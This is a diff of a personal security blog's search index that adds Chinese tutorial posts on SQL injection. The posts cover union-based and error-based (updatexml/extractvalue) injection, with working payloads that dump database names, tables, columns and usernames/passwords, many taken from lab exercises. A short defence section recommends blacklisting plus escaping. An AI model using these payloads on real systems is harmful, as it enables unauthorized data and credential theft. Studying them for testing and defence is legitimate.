+<blockquote>
+<p>当偏移量m过大的时候，查询效率会很低。因为MySQL是先查出m+n个数据，然后抛弃掉前m个数据。</p>
+</blockquote>
+<p><strong>limit 0,1从第一行开始，返回一行</strong></p>
+<p><strong>limit 1,1从第二行开始，返回一行</strong></p>
+<p><strong>limit 2,1从第三行开始，返回一行</strong></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132214461.png" alt="image-20230523132214461"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132219086.png" alt="image-20230523132219086"></p>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol>
+<li><p>参数化查询（数据库服务器在数据库完成SQL指令的编译后，才套用参数运行，因此就算参数中含有有损的指令，也不会被数据库所运行，仅认为它是一个参数。），最好设定传入参数类型，比如是否是数字，<strong>is_numeric($_GET[‘id’])</strong> ，这样就限制了字符的输入。</p>
+</li>
+<li><p>参数长度限制，在PHP下，可用strlen函数检查输入长度</p>
+</li>
+<li><p>函数过滤转义，如addslashes()，它转义一些特殊字符</p>
+</li>
+<li><p>预编译语句，即将要执行的sql语句固定下来，将所传入的参数绑定为一个变量，用”?”表示。</p>
+<p><code>query=&quot;select password from users where username=&#39;admin&#39; or 1=1 &quot;;</code></p>
+<p>这样的话，<strong>admin’ or 1&#x3D;1</strong> 将作为username的值，避免了sql语句的拼接闭合等非法操作。</p>
+</li>
+</ol>
+<p>危险参数过滤：</p>
+<p>1）黑名单过滤：将一些可能用于注入的敏感字符写入黑名单中，如’（单引号）、union、select等，也可能使用正则表达式做过滤，但黑名单可能会有疏漏。</p>
+<p>2）白名单过滤：例如，用数据库中的已知值校对，通常对参数结果进行合法性校验，符合白名单的数据方可显示。</p>
+<p>3）参数转义：对变量默认进行addsalashes（在预定义字符前添加反斜杠），使得SQL注入语句构造失败。</p>
+<p>由于白名单方式要求输出参数有着非常明显的特点，因此适用的业务场景非常有限。总体来说，防护手段仍建议以黑名单+参数转义方式为主，这也是目前针对SQL敏感参数处理的主要方式，以下逐项进行分析。</p>
+<h2 id="内敛执行"><a href="#内敛执行" class="headerlink" title="内敛执行"></a>内敛执行</h2><p><code>select/*!user*/  from users;</code></p>
+<p><a href="http://t.csdn.cn/UD0iS">参考Zero_Adam</a></p>
+]]></content>
+      <categories>
+        <category>web漏洞</category>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>Mysql爆破语句</tag>
+        <tag>注入绕过</tag>
+        <tag>sql注入技巧</tag>
+        <tag>sql注入防御</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入之联合注入</title>
+    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="联合注入的定义、过程，及效果"><a href="#联合注入的定义、过程，及效果" class="headerlink" title="联合注入的定义、过程，及效果"></a>联合注入的定义、过程，及效果</h2><p>使用联合查询进行注入的一种方式，是一种高效的注入的方式，适用于有回显同时数据库软件版本是5.0以上的MYSQL数据库。至于为什么需要版本是5.0以上的MYSQL数据库，是因为MYSQL会有一个系统数据库information_schema，能很快的通过几条注入语句获取到想要的数据。</p>
+<p>union有一个十分严格的约束条件，因为是联合查询，必选保证字段数一致，即两个查询结果有相同的<strong>列数</strong>，因此我们后面要对字段数进行判断。</p>
+<p>mysql中，union用于将多个select语句的结果组合到一个结果集中，并删除结果集中的重复数据。</p>
+<p>1、    判断注入点</p>
+<p>假如存在这么一个参数?id&#x3D;1，可以在参数后面加个单引号或者双引号看是否爆sql语法的错误</p>
+<p>2、    判断<strong>闭合</strong>形式</p>
+<p>主要是判断是否是<strong>整形</strong>闭合，还是字符型闭合，如果是字符型闭合 ，又看是否是<strong>单引</strong>号闭合、双引号闭合，或者是<strong>引号加括号</strong>的闭合形式。</p>
+<p>3、判断查询列数</p>
+<p>1’ order by 1–+</p>
+<p>当order by 3时排序第三个栏位回显正常，而order by 4回显错误，可以判断出当前sql语句向该表查询了三个字段。所以说orderby只是判断了当前sql语句查询的字段数，并不是判断Users表中有几个列，目的是为了符合union的用法，即有相同的字段数。</p>
+<p>20231008<strong>更新一下</strong></p>
+<p>除了order by，还可以用以下方式</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">+</span><span class="keyword">union</span><span class="operator">+</span><span class="keyword">select</span><span class="operator">+</span><span class="keyword">NULL</span><span class="comment">--</span></span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">+</span><span class="keyword">union</span><span class="operator">+</span><span class="keyword">select</span><span class="operator">+</span><span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">--</span></span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">+</span><span class="keyword">union</span><span class="operator">+</span><span class="keyword">select</span><span class="operator">+</span><span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p>然后，尝试替换位置</p>
+<blockquote>
+<p>平时都是union select 1,2,3，这种方法失效了嘞</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span><span class="keyword">NULL</span>,<span class="operator">%</span><span class="number">27</span>qn<span class="operator">%</span><span class="number">27</span>,<span class="keyword">NULL</span><span class="comment">--+</span></span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">27</span>qn<span class="operator">%</span><span class="number">27</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">--+</span></span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span><span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="operator">%</span><span class="number">27</span>qn<span class="operator">%</span><span class="number">27</span><span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">271</span><span class="operator">%</span><span class="number">27</span>,<span class="operator">%</span><span class="number">272</span><span class="operator">%</span><span class="number">27</span><span class="comment">--+ #两个位置都有的话</span></span><br><span class="line"></span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span>username,password<span class="operator">%</span><span class="number">20</span><span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>users<span class="comment">--+ #替换字段</span></span><br><span class="line"></span><br><span class="line">#如果只能显示一个位置</span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span><span class="keyword">NULL</span>,username<span class="operator">||</span><span class="operator">%</span><span class="number">27</span><span class="operator">~</span><span class="operator">%</span><span class="number">27</span><span class="operator">||</span>password<span class="operator">%</span><span class="number">20</span><span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>users<span class="comment">--+</span></span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span><span class="keyword">NULL</span>,concat(username,<span class="operator">%</span><span class="number">27</span><span class="operator">~</span><span class="operator">%</span><span class="number">27</span>,password)<span class="operator">%</span><span class="number">20</span><span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>users<span class="comment">--+</span></span><br><span class="line">#wiener<span class="operator">~</span><span class="number">5</span>qgm</span><br><span class="line"></span><br><span class="line">#数据库信息</span><br><span class="line"></span><br><span class="line">Database type	Query</span><br><span class="line">Microsoft, MySQL	<span class="keyword">SELECT</span> @<span class="variable">@version</span></span><br><span class="line">Oracle	<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> v$version</span><br><span class="line">PostgreSQL	<span class="keyword">SELECT</span> version()</span><br><span class="line"></span><br><span class="line">s<span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">271</span><span class="operator">%</span><span class="number">27</span>,(<span class="keyword">select</span><span class="operator">%</span><span class="number">20</span>@<span class="variable">@version</span>)<span class="comment">--+</span></span><br><span class="line"><span class="string">&#x27; union select &#x27;</span><span class="number">1</span><span class="string">&#x27;,(version())--</span></span><br><span class="line"><span class="string">#如果成功，证明是一个MySQL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#列出数据库内容</span></span><br><span class="line"><span class="string">#除了Oracle，大部分数据库都有一套自己的information_schema</span></span><br><span class="line"><span class="string">#以postgresql为例</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#爆数据库的表名</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">NULL</span>,table_name <span class="keyword">from</span> information_schema.tables<span class="comment">--</span></span><br><span class="line">#<span class="string">&#x27; union select NULL,(select table_name from #information_schema.tables)-- 不行</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#它还必须有一个是NULL，不像sqli-lab的 union select 1,table_name from...</span></span><br><span class="line"><span class="string">#貌似也没有  union select 1,(select * from information_schema.tables),3--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#爆表的列名</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">NULL</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users_edheuq&#x27;</span><span class="comment">--</span></span><br><span class="line"></span><br><span class="line">#爆列的字段</span><br><span class="line"><span class="string">&#x27; union select username_cnxxxn,password_omaiyx from users_edheuq--</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></p>
+<p>4、判断显示位</p>
+<p>对于一个网页，如果它的列数有三列，但可能只有1，2列的数据返回页面前端。所以我们需要查询哪个列会回显，得用unionselect 1,2,3来查看回显位。</p>
+<p>常用语句为-1’ union select 1,2,3–+</p>
+<p>这里一定得是-1 union……，而不是1 union…..因为程序在展示数据的时候通常只会取结果集的第一行数据，mysql_fetch_array只被调用了一次，而mysql_fetch_array从结果集中取得一行作为关联数组或数字数组或二者兼有，具体看第二个参数是什么。所以这里无论怎么折腾最后只会出来第一行的查询结果。</p>
+<p>只要让第一行查询的结果是空集，即union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了</p>
+<p>5、获取所有数据库名</p>
+<p>6、获取数据库所有表名</p>
+<p>7、获取字段名 </p>
+<p>8、获取字段中的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 and &#x27;1&#x27;=&#x27;1 库 //爆库</span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 and &#x27;1&#x27;=&#x27;1 表	 //爆表</span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 and &#x27;1&#x27;=&#x27;1 列							//爆列</span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(&#x27;~&#x27;,username,password) from security.users ),3 and &#x27;1&#x27;=&#x27;1 字段					 //爆字段</span><br></pre></td></tr></table></figure>
+
+<p>参考：<a href="https://blog.csdn.net/qq_61237064/article/details/121758528?ops_request_misc=%7B%22request_id%22:%22168049213216800211546816%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168049213216800211546816&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-121758528-null-null.142%5Ev80%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187">sql注入中的联合注入_ZredamanJ的博客-CSDN博客</a></p>
+]]></content>
+      <categories>
+        <category>web漏洞</category>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>联合注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入之报错注入</title>
+    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h2><p>**updatexml()**，注意，该函数最多显示32位，必要时搭配substr()函数使用</p>
+<p><strong>extravtvalue()</strong></p>
+<p>floor()、rand()…主键重复方式，暂时不展开</p>
+<h2 id="报错注入思想"><a href="#报错注入思想" class="headerlink" title="报错注入思想"></a>报错注入思想</h2><p>语法格式：updatexml(XML_document,Xpath_string,new_value)</p>
+<blockquote>
+<p>XML_document:是字符串String格式，为XML文档对象名称</p>
+<p>Xpath_string:Xpath格式的字符串</p>
+<p>new_value:string格式，替换查找到的符合条件的数据</p>
+</blockquote>
+<p>如果人为构造Xpath_string格式错误，也就是我们将Xpath_string的值传递成不符合格式的参数<strong>（即出现了符号’~’或’^’,’!’等）</strong>，mysql就会报错</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询当前数据库的用户信息以及数据库版本信息:</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3) --+</span><br><span class="line">获取当前数据库下数据表信息：</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3) --+</span><br><span class="line">获取users表名的列名信息：</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e),3) --+</span><br><span class="line">获取users数据表下username、password两列名的用户字段信息:</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),3) --+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),3) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>语法格式：extractvalue()函数语法:extractvalue(XML_document,XPath_string)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取当前是数据库名称及使用mysql数据库的版本信息：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e)) --+</span><br><span class="line">获取当前位置所用数据库的位置：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,@@datadir,0x7e)) --+</span><br><span class="line">获取表名：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+</span><br><span class="line">获取users表的列名：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e)) --+</span><br><span class="line">获取对应的列名的信息(username/password):</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e)) --+</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>web漏洞</category>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>报错注入</tag>
       </tags>
   </entry>
   <entry>
@@ -16215,7 +16248,7 @@ echo $get
 <p>但是貌似没有成功</p>
 <p>邮箱处显示：</p>
 <blockquote>
-<p><a href="mailto:&#49;&#x40;&#49;&#x2e;&#99;&#111;&#109;">&#49;&#x40;&#49;&#x2e;&#99;&#111;&#109;</a>運</p>
+<p><a href="mailto:&#x31;&#x40;&#49;&#x2e;&#99;&#111;&#x6d;">&#x31;&#x40;&#49;&#x2e;&#99;&#111;&#x6d;</a>運</p>
 </blockquote>
 <p>对于登录框，万能密码</p>
 <blockquote>
@@ -16331,8 +16364,8 @@ document.write("blue_test");
         <category>靶场演练</category>
       </categories>
       <tags>
-        <tag>靶场</tag>
         <tag>渗透测试</tag>
+        <tag>靶场</tag>
         <tag>sql注入</tag>
         <tag>bluecms</tag>
         <tag>代码审计</tag>
@@ -18735,7 +18768,7 @@ return $outText;#新值
 </blockquote>
 <p>主题优化参照如下：</p>
 <p><a href="https://shen-yu.gitee.io/2019/ayer/#%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE">Ayer中文说明 | 岛 (gitee.io)</a></p>
-<p>Gittalk配置 <a href="http://t.csdnimg.cn/flZ5A">http://t.csdnimg.cn/flZ5A</a></p>
+<h2 id="gittalk问题"><a href="#gittalk问题" class="headerlink" title="gittalk问题"></a>gittalk问题</h2><p>Gittalk配置 <a href="http://t.csdnimg.cn/flZ5A">http://t.csdnimg.cn/flZ5A</a></p>
 <p>Gittalk <a href="https://github.com/settings/developers">https://github.com/settings/developers</a></p>
 <p>配置完成的时候，<strong>NOT Found</strong></p>
 <p>f12发现**”网络”**下，访问了个请求为：</p>
@@ -18755,6 +18788,9 @@ return $outText;#新值
 <p>但是又出现了另一个关于php资源请求的错误</p>
 <p>将你当初配置的gittalk中的 <strong>Homepage URL</strong>，配置成自己的github<strong>静态页面的路径</strong>即可</p>
 <p>就是找到自己的静态页面仓库，点进去，把上面的<strong>地址栏url</strong>复制过去即可</p>
+<h2 id="search-xml错误"><a href="#search-xml错误" class="headerlink" title="search.xml错误"></a>search.xml错误</h2><p>访问..github.io&#x2F;search.xml，会报错</p>
+<p><img src="/../../../Typora/img111/image-20231022130218792.png"></p>
+<p>去在本地的search.xml文件下搜索x14，x37，x72，x6f所在位置，删掉即可</p>
 <p>以上是对我自己博客的解决方案</p>
 ]]></content>
       <categories>
